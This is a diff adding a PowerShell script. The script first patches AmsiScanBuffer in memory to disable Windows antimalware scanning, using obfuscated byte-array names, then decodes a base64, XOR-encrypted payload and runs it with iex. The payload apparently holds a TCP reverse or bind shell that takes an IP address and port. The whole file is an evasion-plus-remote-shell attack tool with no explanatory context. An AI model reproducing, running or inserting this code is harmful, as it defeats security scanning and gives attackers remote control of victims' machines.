@@ -1,0 +1,90 @@
+
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
+$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
+$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
+$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+#0:  31 c0                   xor    eax,eax
+#2:  05 78 01 19 7f          add    eax,0x7f190178
+#7:  05 df fe ed 00          add    eax,0xedfedf
+#c:  c3                      ret 
+#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+
+$enc = [system.Text.Encoding]::UTF8
+
+
+$EncodedText = "d2R/cmV4fn8xdWNhYnl9MRtqMRsxMTExSlJ8dX10ZVN4f3V4f3Y5VXR3cGR9ZUFwY3B8dGV0Y0J0
+ZV9wfHQsM2N0Z3RjYnQzOEwxQXBjcHw5GxsxMTExMTExMUpBcGNwfHRldGM5QX5ieGV4fn8xLDEh
+PTFccH91cGV+Y2gxLDE1ZWNkdD0xQXBjcHx0ZXRjQnRlX3B8dCwzY3RndGNidDM4TBsxMTExMTEx
+MUpBcGNwfHRldGM5QX5ieGV4fn8xLDEhPTFccH91cGV+Y2gxLDE1d3B9YnQ9MUFwY3B8dGV0Y0J0
+ZV9wfHQsM3N4f3UzOEwbMTExMTExMTFKQmVjeH92TBsxMTExMTExMTVYQVB1dWN0YmI9GxsxMTEx
+MTExMUpBcGNwfHRldGM5QX5ieGV4fn8xLDEgPTFccH91cGV+Y2gxLDE1ZWNkdD0xQXBjcHx0ZXRj
+QnRlX3B8dCwzY3RndGNidDM4TBsxMTExMTExMUpBcGNwfHRldGM5QX5ieGV4fn8xLDEgPTFccH91
+cGV+Y2gxLDE1ZWNkdD0xQXBjcHx0ZXRjQnRlX3B8dCwzc3h/dTM4TBsxMTExMTExMUpYf2VMGzEx
+MTExMTExNUF+Y2U9GxsxMTExMTExMUpBcGNwfHRldGM5QXBjcHx0ZXRjQnRlX3B8dCwzY3RndGNi
+dDM4TBsxMTExMTExMUpCZnhlcnlMGzExMTExMTExNUN0Z3RjYnQ9GxsxMTExMTExMUpBcGNwfHRl
+dGM5QXBjcHx0ZXRjQnRlX3B8dCwzc3h/dTM4TBsxMTExMTExMUpCZnhlcnlMGzExMTExMTExNVN4
+f3UbGzExMTE4GxsxMTExGzExMTFlY2gxGzExMTFqGzExMTExMTExMlJ+f390cmUxc3ByejF4dzFl
+eXQxY3RndGNidDFiZnhlcnkxeGIxZGJ0dT8bMTExMTExMTF4dzE5NUN0Z3RjYnQ4GzExMTExMTEx
+ahsxMTExMTExMTExMTE1cn14dH9lMSwxX3RmPF5ze3RyZTFCaGJldHw/X3RlP0J+cnp0ZWI/RVJB
+Un14dH9lOTVYQVB1dWN0YmI9NUF+Y2U4GzExMTExMTExbBsbMTExMTExMTEyU3h/dTFlfjFleXQx
+YWN+Z3h1dHUxYX5jZTF4dzFTeH91MWJmeGVyeTF4YjFkYnR1PxsxMTExMTExMXh3MTk1U3h/dTgb
+MTExMTExMTFqGzExMTExMTExMTExMTV9eGJldH90YzEsMUpCaGJldHw/X3RlP0J+cnp0ZWI/RXJh
+XXhiZXR/dGNMNUF+Y2UbMTExMTExMTExMTExNX14YmV0f3RjP2JlcGNlOTgxMTExGzExMTExMTEx
+MTExMTVyfXh0f2UxLDE1fXhiZXR/dGM/UHJydGFlRXJhUn14dH9lOTgbMTExMTExMTFsMRsbMTEx
+MTExMTE1YmVjdHB8MSwxNXJ9eHR/ZT9WdGVCZWN0cHw5OBsxMTExMTExMUpzaGV0SkxMNXNoZXRi
+MSwxIT8/JyQkIiRtNGohbBsbMTExMTExMTE1YnR/dXNoZXRiMSwxOUpldGllP3R/cn51eH92TCsr
+UEJSWFg4P1Z0ZVNoZXRiOTNDZH9/eH92MXBiMWRidGMxMzE6MTV0f2crZGJ0Y39wfHQxOjEzMX5/
+MTMxOjE1dH9nK3J+fGFkZXRjf3B8dDE6MTNxf3F/cX8zOBsxMTExMTExMTViZWN0cHw/RmN4ZXQ5
+NWJ0f3VzaGV0Yj0hPTVidH91c2hldGI/XXR/dmV5OBsbMTExMTExMTE1YnR/dXNoZXRiMSwxOUpl
+dGllP3R/cn51eH92TCsrUEJSWFg4P1Z0ZVNoZXRiOTZBQjE2MToxOVZ0ZTxdfnJwZXh+fzg/QXBl
+eTE6MTYvNjgbMTExMTExMTE1YmVjdHB8P0ZjeGV0OTVidH91c2hldGI9IT01YnR/dXNoZXRiP110
+f3ZleTgbGzExMTExMTExZnl4fXQ5OTV4MSwxNWJlY3RwfD9DdHB1OTVzaGV0Yj0xIT0xNXNoZXRi
+P110f3ZleTg4MTx/dDEhOBsxMTExMTExMWobMTExMTExMTExMTExNVR/cn51dHVFdGllMSwxX3Rm
+PF5ze3RyZTE8RWhhdF9wfHQxQmhiZXR8P0V0aWU/UEJSWFhUf3J+dXh/dhsxMTExMTExMTExMTE1
+dXBlcDEsMTVUf3J+dXR1RXRpZT9WdGVCZWN4f3Y5NXNoZXRiPSE9MTV4OBsxMTExMTExMTExMTFl
+Y2gbMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExMlRpdHJkZXQxZXl0MXJ+fHxwf3Uxfn8x
+ZXl0MWVwY3Z0ZT8bMTExMTExMTExMTExMTExMTVidH91c3ByejEsMTlYf2d+enQ8VGlhY3RiYnh+
+fzE8Un58fHB/dTE1dXBlcDEjLzcgMW0xXmRlPEJlY3h/djE4GzExMTExMTExMTExMWwbMTExMTEx
+MTExMTExcnBlcnkbMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExRmN4ZXQ8RnBjf3h/djEz
+Qn58dGV5eH92MWZ0f2UxZmN+f3YxZnhleTF0aXRyZGV4fn8xfncxcn58fHB/dTF+fzFleXQxZXBj
+dnRlPzMxGzExMTExMTExMTExMTExMTFGY3hldDxUY2N+YzE1ThsxMTExMTExMTExMTFsGzExMTEx
+MTExMTExMTVidH91c3ByeiMxMSwxNWJ0f3VzcHJ6MToxNkFCMTYxOjE5VnRlPF1+cnBleH5/OD9B
+cGV5MToxNi8xNhsxMTExMTExMTExMTE1aTEsMTk1dGNjfmNKIUwxbTFeZGU8QmVjeH92OBsxMTEx
+MTExMTExMTE1dGNjfmM/cn10cGM5OBsxMTExMTExMTExMTE1YnR/dXNwcnojMSwxNWJ0f3VzcHJ6
+IzE6MTVpGxsxMTExMTExMTExMTEyQ3RlZGN/MWV5dDFjdGJkfWViGzExMTExMTExMTExMTVidH91
+c2hldDEsMTlKZXRpZT90f3J+dXh/dkwrK1BCUlhYOD9WdGVTaGV0Yjk1YnR/dXNwcnojOBsxMTEx
+MTExMTExMTE1YmVjdHB8P0ZjeGV0OTVidH91c2hldD0hPTVidH91c2hldD9ddH92ZXk4GzExMTEx
+MTExMTExMTViZWN0cHw/V31kYnk5ODExGzExMTExMTExbBsxMTExMTExMTVyfXh0f2U/Un1+YnQ5
+OBsxMTExMTExMXh3MTk1fXhiZXR/dGM4GzExMTExMTExahsxMTExMTExMTExMTE1fXhiZXR/dGM/
+QmV+YTk4GzExMTExMTExbBsxMTExbBsxMTExcnBlcnkbMTExMWobMTExMTExMTFGY3hldDxGcGN/
+eH92MTNCfnx0ZXl4f3YxZnR/ZTFmY35/djAxUnl0cnoxeHcxZXl0MWJ0Y2d0YzF4YjFjdHByeXBz
+fXQxcH91MWh+ZDFwY3QxZGJ4f3YxZXl0MXJ+Y2N0cmUxYX5jZT8zMRsxMTExMTExMUZjeGV0PFRj
+Y35jMTVOGzExMTFsG2wb"
+
+$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
+$data = $enc.GetBytes($file)|%{$_-bXor0x11}
+iex ([System.Text.Encoding]::ASCII.GetString($data))
+
